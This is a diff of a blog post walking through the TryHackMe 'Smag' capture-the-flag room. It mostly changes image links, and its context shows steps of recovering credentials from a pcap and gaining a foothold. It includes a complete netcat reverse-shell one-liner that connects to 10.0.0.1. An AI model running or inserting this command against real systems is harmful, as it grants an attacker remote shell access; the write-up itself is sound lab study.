@@ -1,8 +1,4 @@
----
-layout: post
-tags: wireshark .pcap 
----
-![banner](/assets/img/thm/smag/banner.png)
+![banner](//img/thm/smag/banner.png)
 
 
 **Room by:** 
@@ -41,7 +37,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 **HTML**
 <br />
 
-[![html](/assets/img/thm/smag/welcome.png)](/assets/img/thm/smag/welcome.png)
+[![html](//img/thm/smag/welcome.png)](/Images/welcome.png)
 
 <br />
 
@@ -79,15 +75,15 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 **Now we have the file, lets analyze it using Wireshark.**
 
-[![wireshark](/assets/img/thm/smag/wireshark1.png)](/assets/img/thm/smag/wireshark1.png)
+[![wireshark](//img/thm/smag/wireshark1.png)](/Images/wireshark1.png)
 
 **Follow the HTTP stream:**
 <br />
 
-[![stream](/assets/img/thm/smag/wireshark2.png)](/assets/img/thm/smag/wireshark2.png)
+[![stream](//img/thm/smag/wireshark2.png)](/Images/wireshark2.png)
 
 **This gives us a username, password and a domain name to add to `/etc/hosts`**
-[![dev](/assets/img/thm/smag/devsmag.png)](/assets/img/thm/smag/devsmag.png)
+[![dev](//img/thm/smag/devsmag.png)](/Images/devsmag.png)
 
 
 ## ~ Foothold
@@ -98,17 +94,17 @@ If we browse to `/login.php` we can log in using the creds we found earlier. And
 
 <br />
 
-[![Success](/assets/img/thm/smag/wget.png)](/assets/img/thm/smag/wget.png)
+[![Success](//img/thm/smag/wget.png)](/Images/wget.png)
 
 **Revers Shell:**
 We are going to set up and send a netcat reverse shell.
 <br />
 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
 
-[![admin](/assets/img/thm/smag/adminphp.png)](/assets/img/thm/smag/adminphp.png)
+[![admin](//img/thm/smag/adminphp.png)](/Images/adminphp.png)
 <br />  
 
-[![ncat](/assets/img/thm/smag/nc.png)](/assets/img/thm/smag/nc.png)
+[![ncat](//img/thm/smag/nc.png)](/Images/nc.png)
 
 ## ~ Privesc to user:
 
